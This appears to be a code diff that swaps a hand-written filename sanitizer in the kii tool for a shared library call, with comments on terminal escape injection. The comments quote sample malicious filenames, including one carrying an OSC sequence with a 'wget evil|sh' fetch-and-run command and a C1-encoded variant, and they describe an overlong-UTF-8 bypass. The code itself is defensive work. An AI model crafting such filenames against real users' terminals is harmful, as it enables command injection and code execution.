@@ -94,74 +94,44 @@ fn kii_mode_is_ascii(mode): i64 {
 }
 
 # ANSI-injection defense for stderr path-echo. Returns 1 if `path`
-# contains any byte that must NOT be emitted verbatim to a terminal-
-# attached fd; 0 if the path is safe to echo. The rule is the
-# coreutils-`ls` shape: reject C0 controls (0x00–0x1F) except TAB
-# (0x09) and LF (0x0A), and reject DEL (0x7F). The C1 high-range
-# (0x80–0x9F) is NOT rejected because UTF-8 paths routinely include
-# those bytes as multi-byte-sequence continuations — AGNOS naming
-# (Hawaiian / Sanskrit / East-Asian) is load-bearing on UTF-8 path
-# components.
+# contains anything that must NOT be emitted verbatim to a terminal-
+# attached fd; 0 if the path is safe to echo. The caller in main.cyr
+# (_eprint_path_safe) prints "<path containing control bytes —
+# suppressed>" instead of the path when this returns 1. Pure predicate
+# (no I/O), so tests/cli.tcyr and tests/kii.fcyr drive it directly.
 #
-# Pure predicate (no I/O) so kii.tcyr can assert on it directly.
-# Caller in main.cyr (_eprint_path_safe) emits "<path containing
-# control bytes — suppressed>" instead of the path when this
-# returns 1. See docs/audit/2026-05-22-audit.md § Finding 6 for the
-# threat model: a malicious filename like
-# `/tmp/\x1b]2;wget evil|sh\x07.png` would otherwise propagate raw
-# to fd 2 and reach the user's terminal as an OSC injection
-# (CVE-2021-25743 analog; full corpus at audit doc § 3.4).
+# Threat model: docs/audit/2026-05-22-audit.md § Finding 6. A filename
+# like `/tmp/\x1b]2;wget evil|sh\x07.png` would otherwise reach the
+# user's terminal through fd 2 as an OSC injection (CVE-2021-25743
+# analog). The P-1 sweep (v1.5.1) found the 8-bit C1 spelling of the
+# same attack (`\x9D 0;PWNED \x9C`) walking through a C0-only guard.
+#
+# v1.6.0: the rule is darshana's `tty_has_ctl` (1.3.0), the reject-only
+# twin of its `tty_sanitize_buf`, in UTF-8 mode with TAB and LF kept.
+# darshana shaped that call on THIS function, so the rule is the one
+# kii already had, which is:
+#   - every C0 control (0x00-0x1F) except TAB and LF, and DEL (0x7F);
+#     ESC can never be kept;
+#   - C1 controls in both spellings: a raw 0x80-0x9F where a lead byte
+#     belongs, and the UTF-8 encoding C2 80-C2 9F;
+#   - any malformed UTF-8 — a stray continuation byte, a 0xC0, 0xC1 or
+#     0xF5-0xFF lead, a sequence cut off by the end of the string —
+# plus one deliberate tightening: darshana validates strict RFC 3629,
+# so the overlong 3- and 4-byte forms (E0 80-9F .., F0 80-8F ..),
+# UTF-16 surrogates (ED A0-BF ..) and code points past U+10FFFF
+# (F4 90-BF ..) are refused too. kii's own walk accepted all four,
+# because it checked only that each continuation byte was 0x80-0xBF.
+# None is valid UTF-8, so no legitimate filename produces one, and the
+# overlong forms are a live vector, not a formality: E0 82 9B is an
+# overlong spelling of U+009B (CSI), which a lenient UTF-8 decoder in
+# the terminal turns back into the control the C1 rule exists to stop.
+#
+# `tty_has_ctl` takes (ptr, len); the length comes from strlen, so the
+# string is checked up to its NUL — exactly the bytes _eprint writes.
+# Its -1 (negative len, or an unknown mode) cannot happen with these
+# arguments; it is treated as unsafe anyway, so the guard fails closed.
 fn kii_path_has_control_bytes(path): i64 {
-    var len = strlen(path);
-    var i = 0;
-    while (i < len) {
-        var b = load8(path + i);
-        # C0 (except TAB/LF) + DEL — the original M7(c) guard.
-        if ((b < 0x20 && b != 0x09 && b != 0x0A) || b == 0x7F) {
-            return 1;
-        }
-        if (b < 0x80) { i = i + 1; }
-        else {
-            # ---- the high half: C1 controls, in BOTH encodings ----
-            # P-1 (v1.5.1). The original guard covered C0 + DEL only, so the
-            # 8-bit C1 twins walked straight through: 0x9B IS CSI, 0x9D IS OSC,
-            # 0x90 IS DCS, 0x9C IS ST. A filename built from C1 bytes alone
-            # therefore defeated the entire sanitizer — `\x9D 0;PWNED \x9C .png`
-            # reached stderr byte-for-byte (verified with od), a complete OSC
-            # window-title injection through the very guard that exists to stop
-            # it, while its C0 spelling `ESC ] ... BEL` was correctly suppressed.
-            # kii's stated target is BBS/MUD-era terminal compatibility, which
-            # is exactly where 8-bit C1 handling still lives.
-            #
-            # A flat 0x80..0x9F range test is WRONG here and was the first
-            # attempt: those bytes are also legal UTF-8 CONTINUATION bytes, so
-            # it rejects ordinary non-Latin filenames — `画` is E7 94 BB and
-            # `ч` is D1 87, both carrying a 0x80..0x9F byte. This walks the
-            # UTF-8 structure instead, which lets it catch the two real cases
-            # and neither legitimate one:
-            #   (1) a C1 byte standing where a LEAD byte belongs (8-bit mode);
-            #   (2) the 2-byte UTF-8 spelling C2 80..C2 9F, which a UTF-8
-            #       terminal decodes back to U+0080..U+009F and may honour.
-            # Malformed UTF-8 is also refused: if we cannot tell what the
-            # terminal will make of the bytes, we do not echo them.
-            var seq = 0;
-            if (b >= 0xC2 && b <= 0xDF) { seq = 2; }
-            if (b >= 0xE0 && b <= 0xEF) { seq = 3; }
-            if (b >= 0xF0 && b <= 0xF4) { seq = 4; }
-            if (seq == 0)       { return 1; }   # stray C1 / continuation / overlong lead
-            if (i + seq > len)  { return 1; }   # truncated sequence
-            var k = 1;
-            while (k < seq) {
-                var c = load8(path + i + k);
-                if (c < 0x80 || c > 0xBF) { return 1; }
-                k = k + 1;
-            }
-            if (seq == 2 && b == 0xC2) {
-                var c1 = load8(path + i + 1);
-                if (c1 >= 0x80 && c1 <= 0x9F) { return 1; }   # UTF-8-encoded C1
-            }
-            i = i + seq;
-        }
-    }
-    return 0;
+    var rc = tty_has_ctl(path, strlen(path), TTY_SANITIZE_UTF8, TTY_KEEP_TAB | TTY_KEEP_LF);
+    if (rc == 0) { return 0; }
+    return 1;
 }
